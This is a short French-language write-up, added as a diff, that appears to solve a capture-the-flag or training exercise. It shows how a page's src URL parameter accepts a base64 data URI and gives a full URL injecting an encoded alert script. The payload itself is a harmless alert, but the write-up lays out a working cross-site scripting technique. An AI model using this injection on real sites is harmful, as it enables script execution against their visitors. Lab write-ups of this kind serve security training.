@@ -1,0 +1,12 @@
+A partir de l'image rsa_prism de la page d'acceuil.
+On a une page qui affiche une image avec les parametres dans l'url.
+Si on inspecte la page, on remarque une methode GET, le header nous informe que différents types de contenu sont acceptés notament le type text/html.
+Le paramatre src dans l'url doit correspondre à une image en base64!
+
+On passe le script en source en base64 
+
+exemple: 
+<script>alert('hello')</script>  en base64  ->
+PHNjcmlwdD5hbGVydCgnaGVsbG8nKTwvc2NyaXB0Pg==
+
+http://192.xxx.xxx.xxx/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGVsbG8nKTwvc2NyaXB0Pg==
